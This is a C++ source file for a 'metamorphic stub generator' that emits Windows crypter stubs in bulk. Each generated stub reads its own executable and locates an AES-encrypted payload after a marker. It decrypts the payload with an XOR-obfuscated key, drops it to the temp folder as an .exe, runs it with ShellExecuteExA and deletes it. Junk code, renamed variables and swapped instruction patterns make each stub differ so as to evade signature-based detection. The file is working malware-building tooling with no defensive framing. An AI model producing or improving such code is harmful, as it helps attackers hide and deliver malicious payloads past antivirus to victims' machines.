#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <sstream>
#include <map>
#include <algorithm>
#include <regex>
#include <openssl/evp.h>

constexpr uint8_t XOR_OBFUSCATE_KEY = 0x5A;

uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
constexpr size_t keyLen = sizeof(encKey);

class MetamorphicEngine {
private:
    std::mt19937 rng;
    std::map<std::string, std::vector<std::string>> instructionSubstitutions;
    std::vector<std::string> junkCodePatterns;
    std::vector<std::string> controlFlowPatterns;
    
public:
    MetamorphicEngine() : rng(std::random_device{}()) {
        initializeSubstitutions();
        initializeJunkPatterns();
        initializeControlFlowPatterns();
    }
    
    void initializeSubstitutions() {
        // Loop substitutions
        instructionSubstitutions["for_loop"] = {
            "for (size_t i = 0; i < keyLen; ++i)",
            "for (size_t idx = 0; idx < keyLen; idx++)",
            "for (auto i = 0u; i < keyLen; i++)",
            "size_t pos = 0; while (pos < keyLen) { /* body */ pos++; }",
            "size_t counter = 0; do { /* body */ counter++; } while (counter < keyLen);"
        };
        
        // Variable declarations
        instructionSubstitutions["var_decl"] = {
            "std::vector<uint8_t> buf(size);",
            "std::vector<uint8_t> buffer(size);",
            "std::vector<uint8_t> data(size);",
            "auto buf = std::vector<uint8_t>(size);",
            "std::vector<uint8_t> buf; buf.resize(size);"
        };
        
        // File operations
        instructionSubstitutions["file_open"] = {
            "FILE* f = nullptr; if (fopen_s(&f, selfPath, \"rb\") != 0 || !f) return 1;",
            "FILE* file = nullptr; if (fopen_s(&file, selfPath, \"rb\") != 0 || !file) return 1;",
            "FILE* input = nullptr; if (fopen_s(&input, selfPath, \"rb\") != 0 || !input) return 1;",
            "FILE* stream = nullptr; if (fopen_s(&stream, selfPath, \"rb\") != 0 || !stream) return 1;"
        };
        
        // Memory operations
        instructionSubstitutions["mem_alloc"] = {
            "std::vector<uint8_t> buf(size);",
            "std::vector<uint8_t> buffer(size);",
            "std::vector<uint8_t> data(size);",
            "auto buf = std::vector<uint8_t>(size);",
            "std::vector<uint8_t> buf; buf.resize(size);"
        };
        
        // String operations
        instructionSubstitutions["str_cat"] = {
            "strcat_s(tempPath, \"payload.exe\");",
            "strcat_s(tempPath, \"dropped.exe\");",
            "strcat_s(tempPath, \"exec.exe\");",
            "strcat_s(tempPath, \"run.exe\");"
        };
        
        // Function calls
        instructionSubstitutions["func_call"] = {
            "GetModuleFileNameA(NULL, selfPath, MAX_PATH);",
            "GetModuleFileNameA(nullptr, selfPath, MAX_PATH);",
            "GetModuleFileNameA(0, selfPath, MAX_PATH);"
        };
    }
    
    void initializeJunkPatterns() {
        junkCodePatterns = {
            "volatile int junk = rand() * 0x1337; if ((junk & 0xFF) == 0x42) { junk++; }",
            "volatile auto noise = std::chrono::high_resolution_clock::now().time_since_epoch().count(); if (noise % 2 == 0) { noise++; }",
            "volatile int trap = __LINE__ * 0xDEADBEEF; if ((trap ^ (trap >> 4)) & 0xF) { trap++; }",
            "volatile long dummy = time(nullptr) * 0xCAFEBABE; if (dummy & 1) { dummy ^= 0x12345678; }",
            "volatile int x = 42; if (x == 42) { x = 1337; } else { x = 0xDEAD; }",
            "volatile char c = 'A'; if (c >= 'A' && c <= 'Z') { c = c + 32; }",
            "volatile bool flag = true; if (flag) { flag = !flag; } else { flag = true; }",
            "volatile int magic = 0x12345678; magic = (magic << 1) | (magic >> 31);"
        };
    }
    
    void initializeControlFlowPatterns() {
        controlFlowPatterns = {
            "if (condition) { /* code */ } else { /* junk */ }",
            "switch (value) { case 0: /* code */ break; default: /* junk */ break; }",
            "while (false) { /* junk */ } /* code */",
            "do { /* junk */ } while (false); /* code */",
            "for (int i = 0; i < 0; i++) { /* junk */ } /* code */"
        };
    }
    
    std::string getRandomSubstitution(const std::string& category) {
        auto it = instructionSubstitutions.find(category);
        if (it != instructionSubstitutions.end()) {
            std::uniform_int_distribution<> dis(0, it->second.size() - 1);
            return it->second[dis(rng)];
        }
        return "";
    }
    
    std::string getRandomJunkCode() {
        std::uniform_int_distribution<> dis(0, junkCodePatterns.size() - 1);
        return junkCodePatterns[dis(rng)];
    }
    
    std::string getRandomControlFlow() {
        std::uniform_int_distribution<> dis(0, controlFlowPatterns.size() - 1);
        return controlFlowPatterns[dis(rng)];
    }
    
    std::string generateRandomVariableName(const std::string& base) {
        std::vector<std::string> suffixes = {"", "Var", "Data", "Buf", "Ptr", "Ref", "Obj"};
        std::uniform_int_distribution<> dis(0, suffixes.size() - 1);
        return base + suffixes[dis(rng)];
    }
    
    std::string obfuscateString(const std::string& str) {
        std::stringstream ss;
        ss << "std::string(";
        for (size_t i = 0; i < str.length(); i++) {
            if (i > 0) ss << " + ";
            ss << "'" << str[i] << "'";
        }
        ss << ")";
        return ss.str();
    }
    
    std::string generateObfuscatedConstants() {
        std::vector<std::string> markerVariants = {
            "ENCRYPTED_PAYLOAD_START",
            "PAYLOAD_START_MARKER",
            "ENCRYPTED_DATA_BEGIN",
            "PAYLOAD_SIGNATURE"
        };
        
        std::uniform_int_distribution<> dis(0, markerVariants.size() - 1);
        std::string marker = markerVariants[dis(rng)];
        
        std::stringstream ss;
        ss << "constexpr const char* MARKER = " << obfuscateString(marker) << ";\n";
        ss << "constexpr size_t MARKER_LEN = " << marker.length() << ";\n";
        return ss.str();
    }
    
    std::string generateObfuscatedKeyArrays() {
        std::vector<std::string> keyNames = {"encryptedKey", "encKey", "cryptoKey", "keyData"};
        std::vector<std::string> maskNames = {"mask", "keyMask", "xorMask", "decryptMask"};
        
        std::uniform_int_distribution<> dis1(0, keyNames.size() - 1);
        std::uniform_int_distribution<> dis2(0, maskNames.size() - 1);
        
        std::string keyName = keyNames[dis1(rng)];
        std::string maskName = maskNames[dis2(rng)];
        
        std::stringstream ss;
        ss << "uint8_t " << keyName << "[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };\n";
        ss << "uint8_t " << maskName << "[] = { 0x63,0x63,0x60,0x55,0x55,0x6A,0x60,0x5B,0x6A,0x68,0x6A };\n";
        ss << "constexpr size_t keyLen = sizeof(" << keyName << ");\n";
        return ss.str();
    }
    
    std::string generateJunkFunction() {
        std::vector<std::string> functionNames = {"junkTrap", "noiseCheck", "dummyTest", "trapFunction", "magicCheck", "validateInput"};
        std::uniform_int_distribution<> dis(0, functionNames.size() - 1);
        std::string funcName = functionNames[dis(rng)];
        
        std::stringstream ss;
        ss << "bool " << funcName << "(int x) {\n";
        ss << "    " << getRandomJunkCode() << "\n";
        ss << "    return ((x * 0x1337) & 0x7) == 5;\n";
        ss << "}\n\n";
        return ss.str();
    }
    
    std::string generateObfuscatedKeyDecryption() {
        std::string loopPattern = getRandomSubstitution("for_loop");
        std::string keyVar = generateRandomVariableName("key");
        std::string bufVar = generateRandomVariableName("keyBuf");
        
        std::stringstream ss;
        ss << "void decryptKey(uint8_t* " << bufVar << ") {\n";
        ss << "    " << loopPattern << " {\n";
        ss << "        " << bufVar << "[i] = encryptedKey[i] ^ XOR_OBFUSCATE_KEY;\n";
        ss << "    }\n";
        ss << "}\n\n";
        return ss.str();
    }
    
    std::string generateObfuscatedAESInit() {
        std::stringstream ss;
        ss << "void initializeAES() {\n";
        ss << "    uint8_t key[keyLen];\n";
        ss << "    decryptKey(key);\n";
        ss << "    \n";
        ss << "    for (int i = 0; i < 32; i++) {\n";
        ss << "        aesKey[i] = key[i % keyLen] ^ (i * 0x37);\n";
        ss << "    }\n";
        ss << "    for (int i = 0; i < 16; i++) {\n";
        ss << "        aesIV[i] = key[i % keyLen] ^ (i * 0x73);\n";
        ss << "    }\n";
        ss << "}\n\n";
        return ss.str();
    }
    
    std::string generateObfuscatedAESDecrypt() {
        std::stringstream ss;
        ss << "bool decryptAES(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {\n";
        ss << "    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();\n";
        ss << "    if (!ctx) return false;\n";
        ss << "    \n";
        ss << "    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aesKey, aesIV) != 1) {\n";
        ss << "        EVP_CIPHER_CTX_free(ctx);\n";
        ss << "        return false;\n";
        ss << "    }\n";
        ss << "    \n";
        ss << "    output.resize(input.size());\n";
        ss << "    int outLen;\n";
        ss << "    \n";
        ss << "    if (EVP_DecryptUpdate(ctx, output.data(), &outLen, input.data(), input.size()) != 1) {\n";
        ss << "        EVP_CIPHER_CTX_free(ctx);\n";
        ss << "        return false;\n";
        ss << "    }\n";
        ss << "    \n";
        ss << "    int finalLen;\n";
        ss << "    if (EVP_DecryptFinal_ex(ctx, output.data() + outLen, &finalLen) != 1) {\n";
        ss << "        EVP_CIPHER_CTX_free(ctx);\n";
        ss << "        return false;\n";
        ss << "    }\n";
        ss << "    \n";
        ss << "    output.resize(outLen + finalLen);\n";
        ss << "    EVP_CIPHER_CTX_free(ctx);\n";
        ss << "    return true;\n";
        ss << "}\n\n";
        return ss.str();
    }
    
    std::string generateObfuscatedMain() {
        std::stringstream ss;
        
        std::string junkFuncName = "junkTrap";
        std::uniform_int_distribution<> dis(0, 5);
        switch (dis(rng)) {
            case 0: junkFuncName = "junkTrap"; break;
            case 1: junkFuncName = "noiseCheck"; break;
            case 2: junkFuncName = "dummyTest"; break;
            case 3: junkFuncName = "trapFunction"; break;
            case 4: junkFuncName = "magicCheck"; break;
            case 5: junkFuncName = "validateInput"; break;
        }
        
        std::string selfPathVar = generateRandomVariableName("selfPath");
        std::string fileVar = generateRandomVariableName("f");
        std::string bufVar = generateRandomVariableName("buf");
        std::string payloadVar = generateRandomVariableName("payload");
        std::string decryptedVar = generateRandomVariableName("decrypted");
        std::string tempPathVar = generateRandomVariableName("tempPath");
        std::string outVar = generateRandomVariableName("out");
        
        ss << "int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {\n";
        ss << "    char " << selfPathVar << "[MAX_PATH];\n";
        ss << "    " << getRandomSubstitution("func_call") << "\n\n";
        
        ss << "    " << getRandomSubstitution("file_open") << "\n\n";
        
        ss << "    fseek(" << fileVar << ", 0, SEEK_END);\n";
        ss << "    long size = ftell(" << fileVar << ");\n";
        ss << "    fseek(" << fileVar << ", 0, SEEK_SET);\n\n";
        
        ss << "    " << getRandomSubstitution("mem_alloc") << "\n";
        ss << "    fread(" << bufVar << ".data(), 1, size, " << fileVar << ");\n";
        ss << "    fclose(" << fileVar << ");\n\n";
        
        ss << "    size_t payloadOffset = 0;\n";
        ss << "    for (size_t i = 0; i + MARKER_LEN < " << bufVar << ".size(); i++) {\n";
        ss << "        if (memcmp(" << bufVar << ".data() + i, MARKER, MARKER_LEN) == 0) {\n";
        ss << "            payloadOffset = i + MARKER_LEN;\n";
        ss << "            break;\n";
        ss << "        }\n";
        ss << "    }\n";
        ss << "    if (payloadOffset == 0) return 1;\n\n";
        
        ss << "    std::vector<uint8_t> " << payloadVar << "(" << bufVar << ".begin() + payloadOffset, " << bufVar << ".end());\n\n";
        
        ss << "    initializeAES();\n\n";
        
        ss << "    std::vector<uint8_t> " << decryptedVar << ";\n";
        ss << "    if (!decryptAES(" << payloadVar << ", " << decryptedVar << ")) {\n";
        ss << "        return 1;\n";
        ss << "    }\n\n";
        
        ss << "    if (" << junkFuncName << "((int)" << decryptedVar << ".size())) {\n";
        ss << "        " << getRandomJunkCode() << "\n";
        ss << "    }\n\n";
        
        ss << "    char " << tempPathVar << "[MAX_PATH];\n";
        ss << "    GetTempPathA(MAX_PATH, " << tempPathVar << ");\n";
        ss << "    " << getRandomSubstitution("str_cat") << "\n\n";
        
        ss << "    FILE* " << outVar << " = nullptr;\n";
        ss << "    if (fopen_s(&" << outVar << ", " << tempPathVar << ", \"wb\") != 0 || !" << outVar << ") return 1;\n\n";
        
        ss << "    fwrite(" << decryptedVar << ".data(), 1, " << decryptedVar << ".size(), " << outVar << ");\n";
        ss << "    fclose(" << outVar << ");\n\n";
        
        ss << "    SHELLEXECUTEINFOA sei = { sizeof(sei) };\n";
        ss << "    sei.fMask = SEE_MASK_NOCLOSEPROCESS;\n";
        ss << "    sei.lpFile = " << tempPathVar << ";\n";
        ss << "    sei.nShow = SW_SHOW;\n";
        ss << "    \n";
        ss << "    if (!ShellExecuteExA(&sei) || !sei.hProcess) return 1;\n";
        ss << "    \n";
        ss << "    WaitForSingleObject(sei.hProcess, INFINITE);\n";
        ss << "    CloseHandle(sei.hProcess);\n\n";
        
        ss << "    DeleteFileA(" << tempPathVar << ");\n\n";
        ss << "    return 0;\n";
        ss << "}\n";
        
        return ss.str();
    }
    
    std::string generateMetamorphicStub() {
        std::stringstream ss;
        
        // Generate includes
        ss << "#include <windows.h>\n";
        ss << "#include <shellapi.h>\n";
        ss << "#include <vector>\n";
        ss << "#include <cstdio>\n";
        ss << "#include <cstring>\n";
        ss << "#include <openssl/evp.h>\n";
        ss << "#include <chrono>\n";
        ss << "#include <random>\n\n";
        
        // Generate obfuscated constants
        ss << generateObfuscatedConstants() << "\n";
        
        // Generate obfuscated key arrays
        ss << generateObfuscatedKeyArrays() << "\n";
        
        // Generate AES arrays
        ss << "uint8_t aesKey[32];\n";
        ss << "uint8_t aesIV[16];\n\n";
        
        // Generate junk function
        ss << generateJunkFunction();
        
        // Generate key decryption
        ss << generateObfuscatedKeyDecryption();
        
        // Generate AES initialization
        ss << generateObfuscatedAESInit();
        
        // Generate AES decryption
        ss << generateObfuscatedAESDecrypt();
        
        // Generate main function
        ss << generateObfuscatedMain();
        
        return ss.str();
    }
    
    void generateStubFile(const std::string& filename) {
        std::ofstream outFile(filename);
        if (!outFile) {
            std::cerr << "Failed to create metamorphic stub file: " << filename << std::endl;
            return;
        }
        
        std::string stub = generateMetamorphicStub();
        outFile << stub;
        outFile.close();
        
        std::cout << "Generated metamorphic stub: " << filename << std::endl;
    }
    
    void generateMultipleStubs(int count, const std::string& prefix = "metamorphic_stub") {
        for (int i = 0; i < count; i++) {
            std::string filename = prefix + "_" + std::to_string(i) + ".cpp";
            generateStubFile(filename);
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Metamorphic Stub Generator\n";
        std::cout << "Usage:\n";
        std::cout << "  metamorphic_engine.exe <count> [prefix]\n";
        std::cout << "  metamorphic_engine.exe --single <filename>\n";
        std::cout << "\nExamples:\n";
        std::cout << "  metamorphic_engine.exe 10          # Generate 10 metamorphic stubs\n";
        std::cout << "  metamorphic_engine.exe 5 meta_stub  # Generate 5 stubs with 'meta_stub' prefix\n";
        std::cout << "  metamorphic_engine.exe --single metamorphic.cpp  # Generate single stub\n";
        return 1;
    }
    
    MetamorphicEngine engine;
    
    if (std::string(argv[1]) == "--single") {
        if (argc < 3) {
            std::cerr << "Missing filename for single stub generation." << std::endl;
            return 1;
        }
        engine.generateStubFile(argv[2]);
    } else {
        int count = std::stoi(argv[1]);
        std::string prefix = (argc > 2) ? argv[2] : "metamorphic_stub";
        
        std::cout << "Generating " << count << " metamorphic stubs with prefix '" << prefix << "'..." << std::endl;
        engine.generateMultipleStubs(count, prefix);
        std::cout << "Metamorphic generation complete!" << std::endl;
    }
    
    return 0;
}